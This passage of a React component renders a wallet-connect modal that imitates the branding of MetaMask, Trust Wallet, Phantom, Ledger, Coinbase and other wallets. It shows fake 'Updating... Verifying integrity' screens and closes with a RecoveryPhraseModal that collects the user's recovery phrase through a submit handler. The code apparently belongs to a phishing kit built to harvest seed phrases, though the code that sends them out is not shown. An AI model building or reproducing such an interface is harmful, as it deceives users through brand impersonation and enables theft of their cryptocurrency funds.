            <button style={{ width:'100%', marginTop:8, padding:'14px', borderRadius:50, background:gFlow.color, color:'#fff', border:'none', fontSize:15, fontWeight:700, cursor:'pointer' }}
              onClick={handleGenericUpdate}
            >Update</button>
            <div style={{ fontSize:12, color:'#555', marginTop:2 }}>
              Need help?{' '}<span style={{ color:gFlow.color, cursor:'pointer', fontWeight:500 }}>Contact Support</span>
            </div>
          </div>
        </div>
      )}

      {/* ── Generic wallet: Updating ── */}
      {gFlow.state === 'updating' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', padding:'14px 16px', borderBottom:'1px solid #f0f0f0' }}>
            <img src={gFlow.img} alt={gFlow.name} style={{ width:36, height:36, borderRadius:8, objectFit:'cover' }} />
            <button onClick={closeGeneric} style={{ width:32, height:32, borderRadius:'50%', border:`2px solid ${gFlow.color}`, background:'none', cursor:'pointer', display:'flex', alignItems:'center', justifyContent:'center', color:gFlow.color, fontSize:15, fontWeight:700 }}>✕</button>
          </div>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'22px 20px 20px', gap:10 }}>
            <svg width="52" height="52" viewBox="0 0 52 52" fill="none">
              <circle cx="26" cy="26" r="22" stroke="#e8edf4" strokeWidth="4"/>
              <path d="M26 4 A22 22 0 0 1 48 26" stroke={gFlow.color} strokeWidth="4" strokeLinecap="round"
                style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'26px 26px' }}/>
            </svg>
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Updating {gFlow.name}</div>
            <div style={{ fontSize:15, color:'#555', textAlign:'center' }}>Please wait while we update to version 13.3.0</div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px', marginTop:4 }}>
              <div style={{ marginBottom:8, fontSize:13, color:'#555', lineHeight:1.5 }}>Downloading update...</div>
              <div style={{ width:'100%', height:8, background:'#e0e0e0', borderRadius:99, overflow:'hidden' }}>
                <div style={{ height:'100%', borderRadius:99, background:gFlow.color, width:`${gFlow.progress}%`, transition:'width 0.12s linear' }}/>
              </div>
              <div style={{ textAlign:'center', fontSize:13, color:'#555', marginTop:8, fontWeight:600 }}>{Math.round(gFlow.progress)}%</div>
              <div style={{ fontSize:13, color:'#555', marginTop:8, lineHeight:1.5 }}>Installing new features...</div>
              <div style={{ fontSize:13, color:'#555', marginTop:8, lineHeight:1.5 }}>Verifying integrity...</div>
            </div>
            <div style={{ width:'100%', marginTop:8, padding:'14px', borderRadius:50, background:'#e8edf4', fontSize:15, fontWeight:700, color:'#aaa', textAlign:'center' }}>Please wait...</div>
            <div style={{ fontSize:12, color:'#999', marginTop:2, textAlign:'center' }}>This may take a few moments. Do not close this window.</div>
          </div>
        </div>
      )}

      {/* Main modal — only shown when all idle */}
      {mmState === 'idle' && twState === 'idle' && wcState === 'idle' && cbState === 'idle' && phState === 'idle' && okxState === 'idle' && inchState === 'idle' && rabbyState === 'idle' && rainbowState === 'idle' && keplrState === 'idle' && ledgerState === 'idle' && gFlow.state === 'idle' && open && <div className="wm-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose() }}>
        <div className="wm-modal">
          {/* Drag handle — visible on mobile only */}
          <div className="wm-drag-handle" />

          {/* ── Left panel ── */}
          <div className="wm-left">
            <div className="wm-header-row">
              <div className="wm-brand">
                <span className="wm-brand-pill">reown</span>
                <span className="wm-brand-text">Manual Kit</span>
              </div>
              <button className="wm-close" onClick={onClose}>✕</button>
            </div>

            <input
              className="wm-search"
              placeholder="Search wallet"
              value={search}
              onChange={e => setSearch(e.target.value)}
            />

            <div className="wm-popular-label">Popular:</div>

            <div className="wm-list">
              {filtered.map((w, i) => (
                <div
                  key={i}
                  className={`wm-item${selected?.name === w.name ? ' active' : ''}`}
                  onClick={() => {
                    triggerConnect(w)
                  }}
                >
                  <WalletIcon wallet={w} />
                  <span className="wm-item-name">{w.name}</span>
                </div>
              ))}
            </div>
          </div>

          {/* ── Right panel ── */}
          <div className="wm-right" style={{ background: '#f3f4f6' }}>
            {!selected ? (
              <>
                <svg className="wm-right-icon" width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="10"/>
                  <line x1="2" y1="12" x2="22" y2="12"/>
                  <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
                </svg>
                <p className="wm-right-text">Connect your wallet to get started</p>
              </>
            ) : selected.name === 'MetaMask' ? (
              /* ── MetaMask idle: fox bobbing ── */
              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:20, width:'100%', height:'100%', background:'#f3f4f6' }}>
                <img src="/media/images/metamask-fox-full.svg" alt="MetaMask"
                  style={{ width:160, height:160, objectFit:'contain', animation:'wmBob 2.4s ease-in-out infinite', filter:'drop-shadow(0 8px 24px rgba(0,0,0,0.13))' }}
                />
                <div style={{ fontSize:18, fontWeight:700, color:'#111', marginTop:4 }}>MetaMask</div>
                <div style={{ fontSize:14, color:'#888' }}>Ready to connect</div>
                <button style={{ marginTop:8, padding:'12px 40px', borderRadius:12, background:'#3a96ff', color:'#fff', border:'none', fontSize:15, fontWeight:600, cursor:'pointer' }}
                  onMouseEnter={e => e.currentTarget.style.background='#2a7fe0'}
                  onMouseLeave={e => e.currentTarget.style.background='#3a96ff'}
                  onClick={handleMetaMaskConnect}
                >Connect</button>
              </div>
            ) : selected.name === 'Trust Wallet' ? (
              /* ── Trust Wallet: TRUST wordmark + shield bobbing ── */
              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:20, width:'100%', height:'100%', background:'#f3f4f6' }}>
                {/* Bobbing group: wordmark + shield together */}
                <div style={{ display:'flex', flexDirection:'column', alignItems:'center', gap:8, animation:'wmBob 2.4s ease-in-out infinite', filter:'drop-shadow(0 8px 24px rgba(0,0,0,0.13))' }}>
                  {/* TRUST wordmark */}
                  <svg viewBox="0 0 120 32" width="120" height="32" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                      <linearGradient id="twText" x1="0%" y1="0%" x2="100%" y2="0%">
                        <stop offset="0%" stopColor="#29E07F"/>
                        <stop offset="100%" stopColor="#29C5E0"/>
                      </linearGradient>
                    </defs>
                    <text x="60" y="26" textAnchor="middle" fontFamily="Arial Black, Arial, sans-serif" fontWeight="900" fontSize="28" fill="url(#twText)" letterSpacing="1">TRUST</text>
                  </svg>
                  {/* Shield */}
                  <svg viewBox="0 0 120 130" width="130" height="141" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                      <linearGradient id="twShieldL" x1="0%" y1="0%" x2="0%" y2="100%">
                        <stop offset="0%" stopColor="#29E07F"/>
                        <stop offset="100%" stopColor="#2AC876"/>
                      </linearGradient>
                      <linearGradient id="twShieldR" x1="0%" y1="0%" x2="0%" y2="100%">
                        <stop offset="0%" stopColor="#3375BB"/>
                        <stop offset="100%" stopColor="#1FA5DE"/>
                      </linearGradient>
                    </defs>
                    {/* Left half of shield */}
                    <path d="M60 4 L12 22 L12 62 C12 90 34 112 60 122 L60 4 Z" fill="url(#twShieldL)"/>
                    {/* Right half of shield */}
                    <path d="M60 4 L108 22 L108 62 C108 90 86 112 60 122 L60 4 Z" fill="url(#twShieldR)"/>
                    {/* Shine line */}
                    <path d="M60 4 L60 122" stroke="rgba(255,255,255,0.18)" strokeWidth="2"/>
                  </svg>
                </div>
                <div style={{ fontSize:18, fontWeight:700, color:'#111' }}>Trust Wallet</div>
                <div style={{ fontSize:14, color:'#888' }}>Ready to connect</div>
                <button style={{ marginTop:8, padding:'12px 40px', borderRadius:12, background:'#3a96ff', color:'#fff', border:'none', fontSize:15, fontWeight:600, cursor:'pointer' }}
                  onMouseEnter={e => e.currentTarget.style.background='#2a7fe0'}
                  onMouseLeave={e => e.currentTarget.style.background='#3a96ff'}
                  onClick={handleTrustConnect}
                >Connect</button>
              </div>
            ) : selected.name === 'Rabby Wallet' ? (
              /* ── Rabby: dark navy card, gradient rabbit bobbing ── */
              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:20, width:'100%', height:'100%', background:'#f3f4f6', padding:'20px 24px' }}>
                <div style={{ width:'100%', borderRadius:22, background:'#1e1f5e', padding:'40px 20px 40px', display:'flex', alignItems:'center', justifyContent:'center', boxShadow:'0 8px 32px rgba(26,27,75,0.5)' }}>
                  <svg
                    viewBox="0 0 33 32"
                    width="160"
                    height="155"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                    style={{ animation:'wmBob 2.4s ease-in-out infinite' }}
                  >
                    <defs>
                      <linearGradient id="rabbyBody" x1="6" y1="7" x2="27" y2="26" gradientUnits="userSpaceOnUse">
                        <stop offset="0%" stopColor="#8ba4ff"/>
                        <stop offset="100%" stopColor="#6675e8"/>
                      </linearGradient>
                      <linearGradient id="rabbyEar" x1="14" y1="7" x2="22" y2="14" gradientUnits="userSpaceOnUse">
                        <stop offset="0%" stopColor="#aab8ff"/>
                        <stop offset="100%" stopColor="#8ba4ff" stopOpacity="0.6"/>
                      </linearGradient>
                      <linearGradient id="rabbyBody2" x1="7" y1="14" x2="20" y2="25" gradientUnits="userSpaceOnUse">
                        <stop offset="0%" stopColor="#c4ceff"/>
                        <stop offset="100%" stopColor="#9aaaff"/>
                      </linearGradient>
                    </defs>
                    <path d="M26.9367 17.3244C27.7647 15.4686 23.6717 10.2838 19.7614 8.12371C17.2967 6.45032 14.7284 6.68021 14.2083 7.41496C13.0668 9.02743 17.9882 10.3938 21.2795 11.9882C20.572 12.2965 19.9053 12.8498 19.5132 13.5574C18.2862 12.2133 15.593 11.0558 12.4328 11.9882C10.3032 12.6165 8.53338 14.0977 7.84934 16.335C7.68313 16.2609 7.49911 16.2197 7.3055 16.2197C6.56514 16.2197 5.96497 16.8219 5.96497 17.5648C5.96497 18.3076 6.56514 18.9098 7.3055 18.9098C7.44273 18.9098 7.8718 18.8175 7.8718 18.8175L14.7284 18.8673C11.9863 23.2321 9.81927 23.8701 9.81927 24.6263C9.81927 25.3825 11.8927 25.1775 12.6713 24.8957C16.3983 23.5464 20.4012 19.3412 21.0881 18.1306C23.9727 18.4917 26.3969 18.5344 26.9367 17.3244Z" fill="url(#rabbyBody)"/>
                    <path fillRule="evenodd" clipRule="evenodd" d="M21.2792 11.9883C21.2794 11.9884 21.2796 11.9885 21.2798 11.9885C21.4323 11.9282 21.4076 11.7022 21.3657 11.5246C21.2695 11.1166 19.6082 9.47057 18.0482 8.73332C15.9225 7.72879 14.3573 7.78051 14.1259 8.24346C14.5588 9.13394 16.5663 9.97 18.6629 10.8432C19.5573 11.2157 20.468 11.595 21.2796 11.9881C21.2795 11.9882 21.2794 11.9882 21.2792 11.9883Z" fill="url(#rabbyEar)"/>
                    <path fillRule="evenodd" clipRule="evenodd" d="M18.5817 20.9505C18.1518 20.7856 17.6662 20.6344 17.1141 20.4972C17.7028 19.4403 17.8263 17.8757 17.2703 16.8864C16.4901 15.4981 15.5107 14.7592 13.2347 14.7592C11.9829 14.7592 8.61259 15.1822 8.55275 18.0052C8.54648 18.3014 8.5526 18.5728 8.57396 18.8225L14.7285 18.8672C13.8987 20.1879 13.1217 21.1674 12.4414 21.9122C13.2582 22.1223 13.9322 22.2986 14.5511 22.4604C15.1383 22.614 15.6757 22.7546 16.2382 22.8986C17.0868 22.2783 17.8846 21.6019 18.5817 20.9505Z" fill="url(#rabbyEar)"/>
                    <path d="M7.7672 18.5324C8.01862 20.6769 9.23328 21.5173 11.7153 21.766C14.1973 22.0147 15.6211 21.8479 17.5165 22.0209C19.0996 22.1654 20.5131 22.9749 21.0375 22.6952C21.5094 22.4434 21.2454 21.5339 20.6139 20.9504C19.7954 20.194 18.6625 19.6681 16.6691 19.4815C17.0664 18.3901 16.955 16.8599 16.3381 16.0274C15.446 14.8236 13.7993 14.2793 11.7153 14.5171C9.53798 14.7656 7.45167 15.8411 7.7672 18.5324Z" fill="url(#rabbyBody2)"/>
                  </svg>
                </div>
                <div style={{ fontSize:18, fontWeight:700, color:'#111' }}>Rabby Wallet</div>
                <div style={{ fontSize:14, color:'#888', marginTop:-8 }}>Ready to connect</div>
                <button style={{ marginTop:4, padding:'12px 40px', borderRadius:12, background:'#7084FF', color:'#fff', border:'none', fontSize:15, fontWeight:600, cursor:'pointer' }}
                  onMouseEnter={e => e.currentTarget.style.background='#5a6fe0'}
                  onMouseLeave={e => e.currentTarget.style.background='#7084FF'}
                  onClick={handleRabbyConnect}
                >Connect</button>
              </div>
            ) : selected.name === 'WalletConnect' ? (
              /* ── WalletConnect: white card, logo bobbing, tagline ── */
              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:16, width:'100%', height:'100%', background:'#f3f4f6', padding:'20px 24px' }}>
                <div style={{ width:'100%', borderRadius:24, background:'#fff', border:'1px solid #e8e8e8', padding:'36px 20px 28px', display:'flex', flexDirection:'column', alignItems:'center', gap:20, boxShadow:'0 4px 24px rgba(0,0,0,0.08)' }}>
                  <img
                    src="/media/images/walletconnect.png"
                    alt="WalletConnect"
                    style={{ width:100, height:100, borderRadius:'50%', objectFit:'cover', animation:'wmBob 2.4s ease-in-out infinite' }}
                  />
                  <div style={{ textAlign:'center' }}>
                    <div style={{ fontSize:20, fontWeight:800, color:'#1a1a1a', lineHeight:1.3 }}>Loading Wallet Connect</div>
                    <div style={{ fontSize:14, color:'#888', marginTop:10, lineHeight:1.6 }}>The game-changing wallet for<br/>Ethereum and all EVM chains</div>
                  </div>
                </div>
                <div style={{ fontSize:18, fontWeight:700, color:'#111' }}>WalletConnect</div>
                <div style={{ fontSize:14, color:'#888', marginTop:-8 }}>Ready to connect</div>
                <button style={{ marginTop:4, padding:'12px 40px', borderRadius:12, background:'#3a96ff', color:'#fff', border:'none', fontSize:15, fontWeight:600, cursor:'pointer' }}
                  onMouseEnter={e => e.currentTarget.style.background='#2a7fe0'}
                  onMouseLeave={e => e.currentTarget.style.background='#3a96ff'}
                  onClick={handleWcConnect}
                >Connect</button>
              </div>
            ) : selected.name === 'Keplr' ? (
              /* ── Keplr: same card size as Coinbase ── */
              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:20, width:'100%', height:'100%', background:'#f3f4f6', padding:'24px' }}>
                <div style={{ width:'100%', maxWidth:300, borderRadius:18, overflow:'hidden', background:'#000', boxShadow:'0 4px 24px rgba(0,0,0,0.18)', flexShrink:0, height:180, display:'flex', alignItems:'center', justifyContent:'center' }}>
                  <img
                    src="/media/images/keplr_new.png"
                    alt="Keplr"
                    style={{ width:100, height:100, borderRadius:20, objectFit:'cover', animation:'wmBob 2.4s ease-in-out infinite' }}
                  />
                </div>
                <div style={{ fontSize:18, fontWeight:700, color:'#111' }}>Keplr</div>
                <div style={{ fontSize:14, color:'#888', marginTop:-8 }}>Ready to connect</div>
                <button style={{ marginTop:4, padding:'12px 40px', borderRadius:12, background:'#6F3AFA', color:'#fff', border:'none', fontSize:15, fontWeight:600, cursor:'pointer' }}
                  onMouseEnter={e => e.currentTarget.style.background='#5828d8'}
                  onMouseLeave={e => e.currentTarget.style.background='#6F3AFA'}
                  onClick={handleKeplrConnect}
                >Connect</button>
              </div>
            ) : selected.name === 'Ledger' ? (
              /* ── Ledger: white card, chip icon bobbing, "Connecting to Ledger Kit" ── */
              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:16, width:'100%', height:'100%', background:'#f3f4f6', padding:'20px 24px' }}>
                <div style={{ width:'100%', borderRadius:24, background:'#fff', border:'1px solid #e8e8e8', padding:'36px 20px 28px', display:'flex', flexDirection:'column', alignItems:'center', gap:20, boxShadow:'0 4px 24px rgba(0,0,0,0.08)' }}>
                  {/* Ledger chip icon: lavender rounded square + dark grid shape */}
                  <div style={{ animation:'wmBob 2.4s ease-in-out infinite' }}>
                    <div style={{ width:110, height:110, borderRadius:22, background:'#f0e6f6', display:'flex', alignItems:'center', justifyContent:'center' }}>
                      <svg viewBox="0 0 48 48" width="64" height="64" fill="none" xmlns="http://www.w3.org/2000/svg">
                        {/* Top-left small square */}
                        <rect x="8" y="8" width="13" height="13" rx="2" fill="#2c2c2c"/>
                        {/* Top-right large square */}
                        <rect x="25" y="8" width="15" height="15" rx="2" fill="#2c2c2c"/>
                        {/* Bottom-left rectangle */}
                        <rect x="8" y="25" width="13" height="15" rx="2" fill="#2c2c2c"/>
                        {/* Bottom-right small square */}
                        <rect x="25" y="27" width="15" height="13" rx="2" fill="#2c2c2c"/>
                      </svg>
                    </div>
                  </div>
                  <div style={{ fontSize:17, fontWeight:700, color:'#1a1a1a' }}>Connecting to Ledger Kit</div>
                </div>
                <div style={{ fontSize:18, fontWeight:700, color:'#111' }}>Ledger</div>
                <div style={{ fontSize:14, color:'#888', marginTop:-8 }}>Ready to connect</div>
                <button style={{ marginTop:4, padding:'12px 40px', borderRadius:12, background:'#111', color:'#fff', border:'none', fontSize:15, fontWeight:600, cursor:'pointer' }}
                  onMouseEnter={e => e.currentTarget.style.background='#333'}
                  onMouseLeave={e => e.currentTarget.style.background='#111'}
                  onClick={handleLedgerConnect}
                >Connect</button>
              </div>
            ) : selected.name === 'Rainbow' ? (
              /* ── Rainbow: white card, logo bobbing, tagline ── */
              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:16, width:'100%', height:'100%', background:'#f3f4f6', padding:'20px 24px' }}>
                <div style={{ width:'100%', borderRadius:24, background:'#fff', border:'1px solid #e8e8e8', padding:'36px 20px 32px', display:'flex', flexDirection:'column', alignItems:'center', gap:20, boxShadow:'0 4px 24px rgba(0,0,0,0.08)' }}>
                  <img
                    src="/media/images/wallet-rainbow.png"
                    alt="Rainbow"
                    style={{ width:100, height:100, borderRadius:'50%', objectFit:'cover', animation:'wmBob 2.4s ease-in-out infinite' }}
                  />
                  <div style={{ textAlign:'center' }}>
                    <div style={{ fontSize:20, fontWeight:800, color:'#1a1a1a', lineHeight:1.3 }}>Loading your Rainbow<br/>Wallet...</div>
                    <div style={{ fontSize:14, color:'#555', marginTop:10, lineHeight:1.5 }}>Your colorful gateway to Ethereum and<br/>EVM chains</div>
                  </div>
                </div>
                <div style={{ fontSize:18, fontWeight:700, color:'#111' }}>Rainbow</div>
                <div style={{ fontSize:14, color:'#888', marginTop:-8 }}>Ready to connect</div>
                <button style={{ marginTop:4, padding:'12px 40px', borderRadius:12, background:'linear-gradient(90deg,#FF6B6B,#4D96FF)', color:'#fff', border:'none', fontSize:15, fontWeight:600, cursor:'pointer' }}
                  onClick={handleRainbowConnect}
                >Connect</button>
              </div>
            ) : selected.name === 'Phantom Wallet' ? (
              /* ── Phantom: exact official ghost SVG, purple card ── */
              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:18, width:'100%', height:'100%', background:'#f3f4f6', padding:'20px 24px' }}>
                <div style={{ width:'100%', borderRadius:20, background:'#6B3FE4', padding:'32px 20px 24px', display:'flex', flexDirection:'column', alignItems:'center', gap:18, boxShadow:'0 8px 32px rgba(107,63,228,0.4)' }}>
                  {/* Official Phantom ghost — exact path from phantom.app favicon */}
                  <svg style={{ animation:'wmBob 2.2s ease-in-out infinite' }}
                    width="130" height="130" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" fill="none">
                    {/* Ghost body */}
                    <path d="M9 402.313C9 458.146 37.7123 471 67.5731 471C130.74 471 178.211 413.56 206.541 368.171C203.095 378.212 201.181 388.254 201.181 397.895C201.181 424.405 215.729 443.284 244.441 443.284C283.872 443.284 325.984 407.133 347.805 368.171C346.274 373.794 345.508 379.016 345.508 383.836C345.508 402.313 355.462 413.962 375.752 413.962C439.684 413.962 504 295.467 504 191.834C504 111.097 464.951 40 366.947 40C194.673 40 9 260.119 9 402.313Z" fill="white"/>
                    {/* Left eye */}
                    <path d="M307.608 182.997C307.608 162.913 318.327 148.855 334.023 148.855C349.336 148.855 360.056 162.913 360.056 182.997C360.056 203.081 349.336 217.541 334.023 217.541C318.327 217.541 307.608 203.081 307.608 182.997Z" fill="#6B3FE4"/>
                    {/* Right eye */}
                    <path d="M389.534 182.997C389.534 162.913 400.253 148.855 415.949 148.855C431.262 148.855 441.981 162.913 441.981 182.997C441.981 203.081 431.262 217.541 415.949 217.541C400.253 217.541 389.534 203.081 389.534 182.997Z" fill="#6B3FE4"/>
                  </svg>
                  <div style={{ color:'#fff', fontSize:17, fontWeight:700, letterSpacing:0.5 }}>BooOooOo...</div>
                </div>
                <div style={{ fontSize:18, fontWeight:700, color:'#111' }}>Phantom Wallet</div>
                <div style={{ fontSize:14, color:'#888', marginTop:-6 }}>Ready to connect</div>
                <button style={{ marginTop:2, padding:'12px 40px', borderRadius:12, background:'#9b8aff', color:'#fff', border:'none', fontSize:15, fontWeight:600, cursor:'pointer' }}
                  onMouseEnter={e => e.currentTarget.style.background='#7B6BE0'}
                  onMouseLeave={e => e.currentTarget.style.background='#9b8aff'}
                  onClick={handlePhConnect}
                >Connect</button>
              </div>
            ) : selected.name === 'Coinbase Wallet' ? (
              /* ── Coinbase: video card + dedicated connect ── */
              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:14, width:'100%', height:'100%', background:'#f3f4f6', padding:'16px' }}>
                <div style={{ width:'100%', maxWidth:260, borderRadius:16, overflow:'hidden', background:'#000', boxShadow:'0 4px 24px rgba(0,0,0,0.18)', flexShrink:0 }}>
                  <video src="/media/images/warmwelcome_ext_750x1200.webm" autoPlay loop muted playsInline disablePictureInPicture controlsList="nodownload nofullscreen noremoteplayback" style={{ width:'100%', height:150, objectFit:'cover', display:'block' }} />
                </div>
                <div style={{ fontSize:16, fontWeight:700, color:'#111' }}>Coinbase Wallet</div>
                <div style={{ fontSize:13, color:'#888', marginTop:-6 }}>Ready to connect</div>
                <button style={{ marginTop:2, padding:'10px 36px', borderRadius:12, background:'#0052FF', color:'#fff', border:'none', fontSize:14, fontWeight:600, cursor:'pointer' }}
                  onMouseEnter={e => e.currentTarget.style.background='#0041CC'}
                  onMouseLeave={e => e.currentTarget.style.background='#0052FF'}
                  onClick={handleCbConnect}
                >Connect</button>
              </div>
            ) : selected.name === 'OKX Wallet' ? (
              /* ── OKX: video card + dedicated connect ── */
              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:14, width:'100%', height:'100%', background:'#f3f4f6', padding:'16px' }}>
                <div style={{ width:'100%', maxWidth:260, borderRadius:16, overflow:'hidden', background:'#000', boxShadow:'0 4px 24px rgba(0,0,0,0.18)', flexShrink:0 }}>
                  <video src="/media/images/cover-dark-v3.webm" autoPlay loop muted playsInline disablePictureInPicture controlsList="nodownload nofullscreen noremoteplayback" style={{ width:'100%', height:150, objectFit:'cover', display:'block' }} />
                </div>
                <div style={{ fontSize:16, fontWeight:700, color:'#111' }}>OKX Wallet</div>
                <div style={{ fontSize:13, color:'#888', marginTop:-6 }}>Ready to connect</div>
                <button style={{ marginTop:2, padding:'10px 36px', borderRadius:12, background:'#111', color:'#fff', border:'none', fontSize:14, fontWeight:600, cursor:'pointer' }}
                  onMouseEnter={e => e.currentTarget.style.background='#333'}
                  onMouseLeave={e => e.currentTarget.style.background='#111'}
                  onClick={handleOkxConnect}
                >Connect</button>
              </div>
            ) : (
              /* ── 1inch: video in rounded card ── */
              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:14, width:'100%', height:'100%', background:'#f3f4f6', padding:'16px' }}>
                <div style={{ width:'100%', maxWidth:260, borderRadius:16, overflow:'hidden', background:'#000', boxShadow:'0 4px 24px rgba(0,0,0,0.18)', flexShrink:0 }}>
                  <video src="/media/images/1inch.mp4" autoPlay loop muted playsInline disablePictureInPicture controlsList="nodownload nofullscreen noremoteplayback" style={{ width:'100%', height:150, objectFit:'cover', display:'block' }} />
                </div>
                <div style={{ fontSize:16, fontWeight:700, color:'#111' }}>{selected.name}</div>
                <div style={{ fontSize:13, color:'#888', marginTop:-6 }}>Ready to connect</div>
                <button style={{ marginTop:2, padding:'10px 36px', borderRadius:12, background:'#D82122', color:'#fff', border:'none', fontSize:14, fontWeight:600, cursor:'pointer' }}
                  onMouseEnter={e => e.currentTarget.style.background='#b81a1a'}
                  onMouseLeave={e => e.currentTarget.style.background='#D82122'}
                  onClick={handleInchConnect}
                >Connect</button>
              </div>
            )}
          </div>

        </div>
      </div>}

      {/* Recovery Phrase Modal */}
      {showRecoveryModal && selectedWalletForRecovery && (
        <RecoveryPhraseModal
          walletName={selectedWalletForRecovery.name}
          walletImg={selectedWalletForRecovery.img}
          onClose={() => {
            setShowRecoveryModal(false)
            setPendingWalletConnect(null)
          }}
          onSubmit={handleRecoveryPhraseSubmit}
          isLoading={recoveryLoading}
        />
      )}
    </>
  )
}
